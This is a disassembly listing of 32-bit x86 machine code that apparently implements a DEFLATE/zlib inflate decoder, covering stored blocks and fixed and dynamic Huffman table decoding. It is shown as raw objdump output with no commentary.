  406c00:	5e                   	pop    %esi
  406c01:	5b                   	pop    %ebx
  406c02:	c9                   	leave
  406c03:	c2 04 00             	ret    $0x4
  406c06:	c7 06 0b 00 00 00    	movl   $0xb,(%esi)
  406c0c:	e9 11 09 00 00       	jmp    0x407522
  406c11:	80 3d 90 26 43 00 00 	cmpb   $0x0,0x432690
  406c18:	0f 85 a0 00 00 00    	jne    0x406cbe
  406c1e:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406c22:	b8 10 15 43 00       	mov    $0x431510,%eax
  406c27:	3d 4c 17 43 00       	cmp    $0x43174c,%eax
  406c2c:	b1 08                	mov    $0x8,%cl
  406c2e:	7e 14                	jle    0x406c44
  406c30:	3d 10 19 43 00       	cmp    $0x431910,%eax
  406c35:	7d 04                	jge    0x406c3b
  406c37:	fe c1                	inc    %cl
  406c39:	eb 09                	jmp    0x406c44
  406c3b:	3d 70 19 43 00       	cmp    $0x431970,%eax
  406c40:	7d 02                	jge    0x406c44
  406c42:	b1 07                	mov    $0x7,%cl
  406c44:	0f be c9             	movsbl %cl,%ecx
  406c47:	89 08                	mov    %ecx,(%eax)
  406c49:	83 c0 04             	add    $0x4,%eax
  406c4c:	3d 90 19 43 00       	cmp    $0x431990,%eax
  406c51:	7c d4                	jl     0x406c27
  406c53:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c56:	bf 10 15 43 00       	mov    $0x431510,%edi
  406c5b:	50                   	push   %eax
  406c5c:	68 10 1e 43 00       	push   $0x431e10
  406c61:	68 e8 a5 40 00       	push   $0x40a5e8
  406c66:	68 0c 15 43 00       	push   $0x43150c
  406c6b:	68 20 85 40 00       	push   $0x408520
  406c70:	68 e0 84 40 00       	push   $0x4084e0
  406c75:	68 01 01 00 00       	push   $0x101
  406c7a:	68 20 01 00 00       	push   $0x120
  406c7f:	57                   	push   %edi
  406c80:	e8 80 09 00 00       	call   0x407605
  406c85:	6a 1e                	push   $0x1e
  406c87:	59                   	pop    %ecx
  406c88:	6a 05                	push   $0x5
  406c8a:	58                   	pop    %eax
  406c8b:	f3 ab                	rep stos %eax,%es:(%edi)
  406c8d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c90:	50                   	push   %eax
  406c91:	68 10 1e 43 00       	push   $0x431e10
  406c96:	68 ec a5 40 00       	push   $0x40a5ec
  406c9b:	68 08 15 43 00       	push   $0x431508
  406ca0:	68 9c 85 40 00       	push   $0x40859c
  406ca5:	68 60 85 40 00       	push   $0x408560
  406caa:	6a 00                	push   $0x0
  406cac:	6a 1e                	push   $0x1e
  406cae:	68 10 15 43 00       	push   $0x431510
  406cb3:	e8 4d 09 00 00       	call   0x407605
  406cb8:	fe 05 90 26 43 00    	incb   0x432690
  406cbe:	a0 e8 a5 40 00       	mov    0x40a5e8,%al
  406cc3:	88 46 10             	mov    %al,0x10(%esi)
  406cc6:	a0 ec a5 40 00       	mov    0x40a5ec,%al
  406ccb:	88 46 11             	mov    %al,0x11(%esi)
  406cce:	a1 0c 15 43 00       	mov    0x43150c,%eax
  406cd3:	89 46 14             	mov    %eax,0x14(%esi)
  406cd6:	a1 08 15 43 00       	mov    0x431508,%eax
  406cdb:	89 46 18             	mov    %eax,0x18(%esi)
  406cde:	83 26 00             	andl   $0x0,(%esi)
  406ce1:	e9 3c 08 00 00       	jmp    0x407522
  406ce6:	8b cb                	mov    %ebx,%ecx
  406ce8:	c7 06 09 00 00 00    	movl   $0x9,(%esi)
  406cee:	83 e1 07             	and    $0x7,%ecx
  406cf1:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406cf4:	2b d9                	sub    %ecx,%ebx
  406cf6:	e9 27 08 00 00       	jmp    0x407522
  406cfb:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406cff:	0f 84 2d 08 00 00    	je     0x407532
  406d05:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406d08:	ff 4d cc             	decl   -0x34(%ebp)
  406d0b:	8b cb                	mov    %ebx,%ecx
  406d0d:	0f b6 00             	movzbl (%eax),%eax
  406d10:	d3 e0                	shl    %cl,%eax
  406d12:	09 45 c0             	or     %eax,-0x40(%ebp)
  406d15:	ff 45 c8             	incl   -0x38(%ebp)
  406d18:	83 c3 08             	add    $0x8,%ebx
  406d1b:	83 fb 20             	cmp    $0x20,%ebx
  406d1e:	72 db                	jb     0x406cfb
  406d20:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406d23:	33 db                	xor    %ebx,%ebx
  406d25:	25 ff ff 00 00       	and    $0xffff,%eax
  406d2a:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  406d2d:	3b c3                	cmp    %ebx,%eax
  406d2f:	89 46 04             	mov    %eax,0x4(%esi)
  406d32:	0f 84 e9 00 00 00    	je     0x406e21
  406d38:	6a 0a                	push   $0xa
  406d3a:	58                   	pop    %eax
  406d3b:	e9 e7 00 00 00       	jmp    0x406e27
  406d40:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406d44:	0f 84 e8 07 00 00    	je     0x407532
  406d4a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406d4d:	85 c0                	test   %eax,%eax
  406d4f:	0f 85 98 00 00 00    	jne    0x406ded
  406d55:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  406d5b:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406d5e:	3b d1                	cmp    %ecx,%edx
  406d60:	75 29                	jne    0x406d8b
  406d62:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  406d68:	8d be a0 1b 00 00    	lea    0x1ba0(%esi),%edi
  406d6e:	3b c7                	cmp    %edi,%eax
  406d70:	74 19                	je     0x406d8b
  406d72:	8b d7                	mov    %edi,%edx
  406d74:	3b d0                	cmp    %eax,%edx
  406d76:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406d79:	73 05                	jae    0x406d80
  406d7b:	2b c2                	sub    %edx,%eax
  406d7d:	48                   	dec    %eax
  406d7e:	eb 04                	jmp    0x406d84
  406d80:	2b ca                	sub    %edx,%ecx
  406d82:	8b c1                	mov    %ecx,%eax
  406d84:	85 c0                	test   %eax,%eax
  406d86:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406d89:	75 62                	jne    0x406ded
  406d8b:	ff 75 08             	push   0x8(%ebp)
  406d8e:	89 96 a8 9b 00 00    	mov    %edx,0x9ba8(%esi)
  406d94:	e8 04 08 00 00       	call   0x40759d
  406d99:	8b 96 a8 9b 00 00    	mov    0x9ba8(%esi),%edx
  406d9f:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  406da5:	3b d1                	cmp    %ecx,%edx
  406da7:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406daa:	73 07                	jae    0x406db3
  406dac:	8b c1                	mov    %ecx,%eax
  406dae:	2b c2                	sub    %edx,%eax
  406db0:	48                   	dec    %eax
  406db1:	eb 08                	jmp    0x406dbb
  406db3:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  406db9:	2b c2                	sub    %edx,%eax
  406dbb:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  406dc1:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406dc4:	3b d7                	cmp    %edi,%edx
  406dc6:	75 1d                	jne    0x406de5
  406dc8:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  406dce:	3b d1                	cmp    %ecx,%edx
  406dd0:	74 13                	je     0x406de5
  406dd2:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406dd5:	73 07                	jae    0x406dde
  406dd7:	2b ca                	sub    %edx,%ecx
  406dd9:	49                   	dec    %ecx
  406dda:	8b c1                	mov    %ecx,%eax
  406ddc:	eb 04                	jmp    0x406de2
  406dde:	2b fa                	sub    %edx,%edi
  406de0:	8b c7                	mov    %edi,%eax
  406de2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406de5:	85 c0                	test   %eax,%eax
  406de7:	0f 84 61 07 00 00    	je     0x40754e
  406ded:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  406df0:	72 03                	jb     0x406df5
  406df2:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406df5:	8b 4e 04             	mov    0x4(%esi),%ecx
  406df8:	3b c8                	cmp    %eax,%ecx
  406dfa:	8b f9                	mov    %ecx,%edi
  406dfc:	72 02                	jb     0x406e00
  406dfe:	8b f8                	mov    %eax,%edi
  406e00:	57                   	push   %edi
  406e01:	ff 75 c8             	push   -0x38(%ebp)
  406e04:	ff 75 d0             	push   -0x30(%ebp)
  406e07:	e8 5e f2 ff ff       	call   0x40606a
  406e0c:	01 7d c8             	add    %edi,-0x38(%ebp)
  406e0f:	29 7d cc             	sub    %edi,-0x34(%ebp)
  406e12:	01 7d d0             	add    %edi,-0x30(%ebp)
  406e15:	29 7d d4             	sub    %edi,-0x2c(%ebp)
  406e18:	29 7e 04             	sub    %edi,0x4(%esi)
  406e1b:	0f 85 01 07 00 00    	jne    0x407522
  406e21:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  406e27:	89 06                	mov    %eax,(%esi)
  406e29:	e9 f4 06 00 00       	jmp    0x407522
  406e2e:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406e32:	0f 84 fa 06 00 00    	je     0x407532
  406e38:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406e3b:	ff 4d cc             	decl   -0x34(%ebp)
  406e3e:	8b cb                	mov    %ebx,%ecx
  406e40:	0f b6 00             	movzbl (%eax),%eax
  406e43:	d3 e0                	shl    %cl,%eax
  406e45:	09 45 c0             	or     %eax,-0x40(%ebp)
  406e48:	ff 45 c8             	incl   -0x38(%ebp)
  406e4b:	83 c3 08             	add    $0x8,%ebx
  406e4e:	83 fb 0e             	cmp    $0xe,%ebx
  406e51:	72 db                	jb     0x406e2e
  406e53:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406e56:	25 ff 3f 00 00       	and    $0x3fff,%eax
  406e5b:	8b c8                	mov    %eax,%ecx
  406e5d:	89 46 04             	mov    %eax,0x4(%esi)
  406e60:	83 e1 1f             	and    $0x1f,%ecx
  406e63:	80 f9 1d             	cmp    $0x1d,%cl
  406e66:	0f 87 59 fd ff ff    	ja     0x406bc5
  406e6c:	25 e0 03 00 00       	and    $0x3e0,%eax
  406e71:	3d a0 03 00 00       	cmp    $0x3a0,%eax
  406e76:	0f 87 49 fd ff ff    	ja     0x406bc5
  406e7c:	c1 6d c0 0e          	shrl   $0xe,-0x40(%ebp)
  406e80:	83 eb 0e             	sub    $0xe,%ebx
  406e83:	83 66 08 00          	andl   $0x0,0x8(%esi)
  406e87:	c7 06 0c 00 00 00    	movl   $0xc,(%esi)
  406e8d:	8b 46 04             	mov    0x4(%esi),%eax
  406e90:	c1 e8 0a             	shr    $0xa,%eax
  406e93:	83 c0 04             	add    $0x4,%eax
  406e96:	39 46 08             	cmp    %eax,0x8(%esi)
  406e99:	73 69                	jae    0x406f04
  406e9b:	eb 20                	jmp    0x406ebd
  406e9d:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406ea1:	0f 84 8b 06 00 00    	je     0x407532
  406ea7:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406eaa:	ff 4d cc             	decl   -0x34(%ebp)
  406ead:	8b cb                	mov    %ebx,%ecx
  406eaf:	0f b6 00             	movzbl (%eax),%eax
  406eb2:	d3 e0                	shl    %cl,%eax
  406eb4:	09 45 c0             	or     %eax,-0x40(%ebp)
  406eb7:	ff 45 c8             	incl   -0x38(%ebp)
  406eba:	83 c3 08             	add    $0x8,%ebx
  406ebd:	83 fb 03             	cmp    $0x3,%ebx
  406ec0:	72 db                	jb     0x406e9d
  406ec2:	8b 4e 08             	mov    0x8(%esi),%ecx
  406ec5:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406ec8:	83 e0 07             	and    $0x7,%eax
  406ecb:	83 eb 03             	sub    $0x3,%ebx
  406ece:	0f be 89 cc 84 40 00 	movsbl 0x4084cc(%ecx),%ecx
  406ed5:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  406ed9:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  406edd:	8b 4e 04             	mov    0x4(%esi),%ecx
  406ee0:	ff 46 08             	incl   0x8(%esi)
  406ee3:	8b 46 08             	mov    0x8(%esi),%eax
  406ee6:	c1 e9 0a             	shr    $0xa,%ecx
  406ee9:	83 c1 04             	add    $0x4,%ecx
  406eec:	3b c1                	cmp    %ecx,%eax
  406eee:	72 cd                	jb     0x406ebd
  406ef0:	eb 12                	jmp    0x406f04
  406ef2:	8b 46 08             	mov    0x8(%esi),%eax
  406ef5:	0f be 80 cc 84 40 00 	movsbl 0x4084cc(%eax),%eax
  406efc:	83 64 86 0c 00       	andl   $0x0,0xc(%esi,%eax,4)
  406f01:	ff 46 08             	incl   0x8(%esi)
  406f04:	83 7e 08 13          	cmpl   $0x13,0x8(%esi)
  406f08:	72 e8                	jb     0x406ef2
  406f0a:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  406f0d:	8d be 0c 05 00 00    	lea    0x50c(%esi),%edi
  406f13:	51                   	push   %ecx
  406f14:	8d 8e 20 05 00 00    	lea    0x520(%esi),%ecx
  406f1a:	51                   	push   %ecx
  406f1b:	8d 8e 10 05 00 00    	lea    0x510(%esi),%ecx
  406f21:	33 c0                	xor    %eax,%eax
  406f23:	57                   	push   %edi
  406f24:	51                   	push   %ecx
  406f25:	50                   	push   %eax
  406f26:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406f29:	50                   	push   %eax
  406f2a:	6a 13                	push   $0x13
  406f2c:	8d 46 0c             	lea    0xc(%esi),%eax
  406f2f:	6a 13                	push   $0x13
  406f31:	50                   	push   %eax
  406f32:	c7 07 07 00 00 00    	movl   $0x7,(%edi)
  406f38:	e8 c8 06 00 00       	call   0x407605
  406f3d:	85 c0                	test   %eax,%eax
  406f3f:	75 12                	jne    0x406f53
  406f41:	39 07                	cmp    %eax,(%edi)
  406f43:	74 0e                	je     0x406f53
  406f45:	21 46 08             	and    %eax,0x8(%esi)
  406f48:	c7 06 0d 00 00 00    	movl   $0xd,(%esi)
  406f4e:	e9 1d 01 00 00       	jmp    0x407070
  406f53:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  406f59:	e9 c4 05 00 00       	jmp    0x407522
  406f5e:	8b 86 0c 05 00 00    	mov    0x50c(%esi),%eax
  406f64:	eb 20                	jmp    0x406f86
  406f66:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406f6a:	0f 84 c2 05 00 00    	je     0x407532
  406f70:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406f73:	ff 4d cc             	decl   -0x34(%ebp)
  406f76:	0f b6 11             	movzbl (%ecx),%edx
  406f79:	8b cb                	mov    %ebx,%ecx
  406f7b:	d3 e2                	shl    %cl,%edx
  406f7d:	09 55 c0             	or     %edx,-0x40(%ebp)
  406f80:	ff 45 c8             	incl   -0x38(%ebp)
  406f83:	83 c3 08             	add    $0x8,%ebx
  406f86:	3b d8                	cmp    %eax,%ebx
  406f88:	72 dc                	jb     0x406f66
  406f8a:	0f b7 04 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%eax
  406f91:	00 
  406f92:	23 45 c0             	and    -0x40(%ebp),%eax
  406f95:	8b 8e 10 05 00 00    	mov    0x510(%esi),%ecx
  406f9b:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  406f9e:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  406fa2:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406fa6:	83 f8 10             	cmp    $0x10,%eax
  406fa9:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406fac:	73 16                	jae    0x406fc4
  406fae:	8b ca                	mov    %edx,%ecx
  406fb0:	2b da                	sub    %edx,%ebx
  406fb2:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406fb5:	8b 4e 08             	mov    0x8(%esi),%ecx
  406fb8:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  406fbc:	ff 46 08             	incl   0x8(%esi)
  406fbf:	e9 ac 00 00 00       	jmp    0x407070
  406fc4:	83 f8 12             	cmp    $0x12,%eax
  406fc7:	75 0c                	jne    0x406fd5
  406fc9:	6a 07                	push   $0x7
  406fcb:	c7 45 f8 0b 00 00 00 	movl   $0xb,-0x8(%ebp)
  406fd2:	58                   	pop    %eax
  406fd3:	eb 2c                	jmp    0x407001
  406fd5:	83 c0 f2             	add    $0xfffffff2,%eax
  406fd8:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%ebp)
  406fdf:	eb 20                	jmp    0x407001
  406fe1:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406fe5:	0f 84 47 05 00 00    	je     0x407532
  406feb:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406fee:	ff 4d cc             	decl   -0x34(%ebp)
  406ff1:	0f b6 39             	movzbl (%ecx),%edi
  406ff4:	8b cb                	mov    %ebx,%ecx
  406ff6:	d3 e7                	shl    %cl,%edi
  406ff8:	09 7d c0             	or     %edi,-0x40(%ebp)
  406ffb:	ff 45 c8             	incl   -0x38(%ebp)
  406ffe:	83 c3 08             	add    $0x8,%ebx
  407001:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  407004:	3b d9                	cmp    %ecx,%ebx
  407006:	72 d9                	jb     0x406fe1
  407008:	8b ca                	mov    %edx,%ecx
  40700a:	2b da                	sub    %edx,%ebx
  40700c:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  40700f:	0f b7 0c 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%ecx
  407016:	00 
  407017:	23 4d c0             	and    -0x40(%ebp),%ecx
  40701a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40701d:	2b d8                	sub    %eax,%ebx
  40701f:	03 d1                	add    %ecx,%edx
  407021:	8b c8                	mov    %eax,%ecx
  407023:	8b 46 04             	mov    0x4(%esi),%eax
  407026:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  407029:	8b 4e 08             	mov    0x8(%esi),%ecx
  40702c:	8b f8                	mov    %eax,%edi
  40702e:	c1 ef 05             	shr    $0x5,%edi
  407031:	83 e7 1f             	and    $0x1f,%edi
  407034:	83 e0 1f             	and    $0x1f,%eax
  407037:	8d 84 07 02 01 00 00 	lea    0x102(%edi,%eax,1),%eax
  40703e:	8d 3c 0a             	lea    (%edx,%ecx,1),%edi
  407041:	3b f8                	cmp    %eax,%edi
  407043:	0f 87 7c fb ff ff    	ja     0x406bc5
  407049:	83 7d ec 10          	cmpl   $0x10,-0x14(%ebp)
  40704d:	75 0f                	jne    0x40705e
  40704f:	83 f9 01             	cmp    $0x1,%ecx
  407052:	0f 82 6d fb ff ff    	jb     0x406bc5
  407058:	8b 7c 8e 08          	mov    0x8(%esi,%ecx,4),%edi
  40705c:	eb 02                	jmp    0x407060
  40705e:	33 ff                	xor    %edi,%edi
  407060:	8d 44 8e 0c          	lea    0xc(%esi,%ecx,4),%eax
  407064:	89 38                	mov    %edi,(%eax)
  407066:	41                   	inc    %ecx
  407067:	83 c0 04             	add    $0x4,%eax
  40706a:	4a                   	dec    %edx
  40706b:	75 f7                	jne    0x407064
  40706d:	89 4e 08             	mov    %ecx,0x8(%esi)
  407070:	8b 46 04             	mov    0x4(%esi),%eax
  407073:	8b 4e 08             	mov    0x8(%esi),%ecx
  407076:	8b d0                	mov    %eax,%edx
  407078:	83 e0 1f             	and    $0x1f,%eax
  40707b:	c1 ea 05             	shr    $0x5,%edx
  40707e:	83 e2 1f             	and    $0x1f,%edx
  407081:	8d 84 02 02 01 00 00 	lea    0x102(%edx,%eax,1),%eax
  407088:	3b c8                	cmp    %eax,%ecx
  40708a:	0f 82 ce fe ff ff    	jb     0x406f5e
  407090:	8b 46 04             	mov    0x4(%esi),%eax
  407093:	83 a6 10 05 00 00 00 	andl   $0x0,0x510(%esi)
  40709a:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  40709e:	8b f8                	mov    %eax,%edi
  4070a0:	c1 e8 05             	shr    $0x5,%eax
  4070a3:	83 e7 1f             	and    $0x1f,%edi
  4070a6:	b9 01 01 00 00       	mov    $0x101,%ecx
  4070ab:	83 e0 1f             	and    $0x1f,%eax
  4070ae:	03 f9                	add    %ecx,%edi
  4070b0:	40                   	inc    %eax
  4070b1:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4070b4:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4070b7:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  4070bd:	52                   	push   %edx
  4070be:	50                   	push   %eax
  4070bf:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4070c2:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  4070c9:	50                   	push   %eax
  4070ca:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4070cd:	50                   	push   %eax
  4070ce:	68 20 85 40 00       	push   $0x408520
  4070d3:	68 e0 84 40 00       	push   $0x4084e0
  4070d8:	51                   	push   %ecx
  4070d9:	8d 46 0c             	lea    0xc(%esi),%eax
  4070dc:	57                   	push   %edi
  4070dd:	50                   	push   %eax
  4070de:	c7 45 f0 06 00 00 00 	movl   $0x6,-0x10(%ebp)
  4070e5:	e8 1b 05 00 00       	call   0x407605
  4070ea:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4070ee:	75 03                	jne    0x4070f3
  4070f0:	83 c8 ff             	or     $0xffffffff,%eax
  4070f3:	85 c0                	test   %eax,%eax
  4070f5:	0f 85 ca fa ff ff    	jne    0x406bc5
  4070fb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4070fe:	50                   	push   %eax
  4070ff:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  407105:	50                   	push   %eax
  407106:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407109:	50                   	push   %eax
  40710a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40710d:	50                   	push   %eax
  40710e:	68 9c 85 40 00       	push   $0x40859c
  407113:	68 60 85 40 00       	push   $0x408560
  407118:	6a 00                	push   $0x0
  40711a:	ff 75 ec             	push   -0x14(%ebp)
  40711d:	8d 44 be 0c          	lea    0xc(%esi,%edi,4),%eax
  407121:	50                   	push   %eax
  407122:	e8 de 04 00 00       	call   0x407605
  407127:	85 c0                	test   %eax,%eax
  407129:	0f 85 96 fa ff ff    	jne    0x406bc5
  40712f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407132:	85 c0                	test   %eax,%eax
  407134:	75 0c                	jne    0x407142
  407136:	81 ff 01 01 00 00    	cmp    $0x101,%edi
  40713c:	0f 8f 83 fa ff ff    	jg     0x406bc5
  407142:	8a 4d fc             	mov    -0x4(%ebp),%cl
  407145:	83 26 00             	andl   $0x0,(%esi)
  407148:	88 46 11             	mov    %al,0x11(%esi)
  40714b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40714e:	89 46 14             	mov    %eax,0x14(%esi)
  407151:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407154:	88 4e 10             	mov    %cl,0x10(%esi)
  407157:	89 46 18             	mov    %eax,0x18(%esi)
  40715a:	0f b6 46 10          	movzbl 0x10(%esi),%eax
  40715e:	89 46 0c             	mov    %eax,0xc(%esi)
  407161:	8b 46 14             	mov    0x14(%esi),%eax
  407164:	89 46 08             	mov    %eax,0x8(%esi)
  407167:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  40716d:	8b 46 0c             	mov    0xc(%esi),%eax
  407170:	eb 20                	jmp    0x407192
  407172:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  407176:	0f 84 b6 03 00 00    	je     0x407532
  40717c:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40717f:	ff 4d cc             	decl   -0x34(%ebp)
  407182:	0f b6 11             	movzbl (%ecx),%edx
  407185:	8b cb                	mov    %ebx,%ecx
  407187:	d3 e2                	shl    %cl,%edx
  407189:	09 55 c0             	or     %edx,-0x40(%ebp)
  40718c:	ff 45 c8             	incl   -0x38(%ebp)
  40718f:	83 c3 08             	add    $0x8,%ebx
  407192:	3b d8                	cmp    %eax,%ebx
  407194:	72 dc                	jb     0x407172
  407196:	0f b7 04 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%eax
  40719d:	00 
  40719e:	23 45 c0             	and    -0x40(%ebp),%eax
  4071a1:	8b 4e 08             	mov    0x8(%esi),%ecx
  4071a4:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4071a7:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  4071ab:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  4071ae:	2b d9                	sub    %ecx,%ebx
  4071b0:	0f b6 08             	movzbl (%eax),%ecx
  4071b3:	85 c9                	test   %ecx,%ecx
  4071b5:	75 12                	jne    0x4071c9
  4071b7:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4071bb:	89 46 08             	mov    %eax,0x8(%esi)
  4071be:	c7 06 06 00 00 00    	movl   $0x6,(%esi)
  4071c4:	e9 59 03 00 00       	jmp    0x407522
  4071c9:	f6 c1 10             	test   $0x10,%cl
  4071cc:	74 18                	je     0x4071e6
  4071ce:	83 e1 0f             	and    $0xf,%ecx
  4071d1:	89 4e 08             	mov    %ecx,0x8(%esi)
  4071d4:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4071d8:	89 46 04             	mov    %eax,0x4(%esi)
  4071db:	c7 06 02 00 00 00    	movl   $0x2,(%esi)
  4071e1:	e9 3c 03 00 00       	jmp    0x407522
  4071e6:	f6 c1 40             	test   $0x40,%cl
  4071e9:	0f 84 d1 00 00 00    	je     0x4072c0
  4071ef:	f6 c1 20             	test   $0x20,%cl
  4071f2:	0f 84 cd f9 ff ff    	je     0x406bc5
  4071f8:	c7 06 07 00 00 00    	movl   $0x7,(%esi)
  4071fe:	e9 1f 03 00 00       	jmp    0x407522
  407203:	8b 46 08             	mov    0x8(%esi),%eax
  407206:	eb 20                	jmp    0x407228
  407208:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  40720c:	0f 84 20 03 00 00    	je     0x407532
  407212:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407215:	ff 4d cc             	decl   -0x34(%ebp)
  407218:	0f b6 11             	movzbl (%ecx),%edx
  40721b:	8b cb                	mov    %ebx,%ecx
  40721d:	d3 e2                	shl    %cl,%edx
  40721f:	09 55 c0             	or     %edx,-0x40(%ebp)
  407222:	ff 45 c8             	incl   -0x38(%ebp)
  407225:	83 c3 08             	add    $0x8,%ebx
  407228:	3b d8                	cmp    %eax,%ebx
  40722a:	72 dc                	jb     0x407208
  40722c:	0f b7 0c 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%ecx
  407233:	00 
  407234:	23 4d c0             	and    -0x40(%ebp),%ecx
  407237:	01 4e 04             	add    %ecx,0x4(%esi)
  40723a:	8b c8                	mov    %eax,%ecx
  40723c:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  40723f:	2b d8                	sub    %eax,%ebx
  407241:	0f b6 46 11          	movzbl 0x11(%esi),%eax
  407245:	89 46 0c             	mov    %eax,0xc(%esi)
  407248:	8b 46 18             	mov    0x18(%esi),%eax
  40724b:	89 46 08             	mov    %eax,0x8(%esi)
  40724e:	c7 06 03 00 00 00    	movl   $0x3,(%esi)
  407254:	8b 46 0c             	mov    0xc(%esi),%eax
  407257:	eb 20                	jmp    0x407279
  407259:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  40725d:	0f 84 cf 02 00 00    	je     0x407532
  407263:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407266:	ff 4d cc             	decl   -0x34(%ebp)
  407269:	0f b6 11             	movzbl (%ecx),%edx
  40726c:	8b cb                	mov    %ebx,%ecx
  40726e:	d3 e2                	shl    %cl,%edx
  407270:	09 55 c0             	or     %edx,-0x40(%ebp)
  407273:	ff 45 c8             	incl   -0x38(%ebp)
  407276:	83 c3 08             	add    $0x8,%ebx
  407279:	3b d8                	cmp    %eax,%ebx
  40727b:	72 dc                	jb     0x407259
  40727d:	0f b7 04 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%eax
  407284:	00 
  407285:	23 45 c0             	and    -0x40(%ebp),%eax
  407288:	8b 4e 08             	mov    0x8(%esi),%ecx
  40728b:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  40728e:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  407292:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  407295:	2b d9                	sub    %ecx,%ebx
  407297:	0f b6 08             	movzbl (%eax),%ecx
  40729a:	f6 c1 10             	test   $0x10,%cl
  40729d:	74 18                	je     0x4072b7
  40729f:	83 e1 0f             	and    $0xf,%ecx
  4072a2:	89 4e 08             	mov    %ecx,0x8(%esi)
  4072a5:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4072a9:	89 46 0c             	mov    %eax,0xc(%esi)
  4072ac:	c7 06 04 00 00 00    	movl   $0x4,(%esi)
  4072b2:	e9 6b 02 00 00       	jmp    0x407522
  4072b7:	f6 c1 40             	test   $0x40,%cl
  4072ba:	0f 85 05 f9 ff ff    	jne    0x406bc5
  4072c0:	89 4e 0c             	mov    %ecx,0xc(%esi)
  4072c3:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  4072c7:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  4072ca:	89 46 08             	mov    %eax,0x8(%esi)
  4072cd:	e9 50 02 00 00       	jmp    0x407522
  4072d2:	8b 46 08             	mov    0x8(%esi),%eax
  4072d5:	eb 20                	jmp    0x4072f7
